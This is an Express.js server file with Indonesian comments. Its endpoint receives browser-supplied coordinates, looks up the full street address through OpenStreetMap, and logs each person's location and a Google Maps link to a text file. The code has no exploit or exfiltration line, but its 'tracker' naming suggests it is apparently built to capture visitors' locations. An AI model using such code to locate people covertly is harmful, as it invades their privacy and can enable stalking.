const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Endpoint utama
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint buat nangkep lokasi & nyari alamat lengkap
app.post('/api/save-location', async (req, res) => {
    const { lat, lon, accuracy } = req.body;

    if (!lat || !lon) {
        return res.status(400).json({ status: 'error', message: 'Data lokasi kosong' });
    }

    try {
        // Tembak API OpenStreetMap buat dapetin alamat asli
        const osmRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {
            headers: { 'User-Agent': 'TrackerApp/1.0' } // Wajib pake User-Agent
        });
        
        const osmData = await osmRes.json();
        const alamatLengkap = osmData.display_name || "Alamat tidak ditemukan";
        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        // Format log yang bakal masuk ke file log.txt
        const logData = `
==================================================
WAKTU       : ${new Date().toLocaleString('id-ID')}
KOORDINAT   : Lat ${lat}, Lon ${lon} (Akurasi: ${accuracy}m)
ALAMAT      : ${alamatLengkap}
LIHAT PETA  : ${googleMapsLink}
==================================================\n`;

        // Simpan ke file
        fs.appendFile(path.join(__dirname, 'log.txt'), logData, (err) => {
            if (err) {
                console.error(err);
                return res.status(500).json({ status: 'error' });
            }
            console.log(logData);
            res.status(200).json({ status: 'success', alamat: alamatLengkap });
        });

    } catch (error) {
        console.error("Gagal nembak API:", error);
        res.status(500).json({ status: 'error', message: 'Gagal ambil alamat' });
    }
});

app.listen(PORT, () => {
    console.log(`\n====================================`);
    console.log(`SERVER JALAN! Buka: http://localhost:${PORT}`);
    console.log(`====================================\n`);
});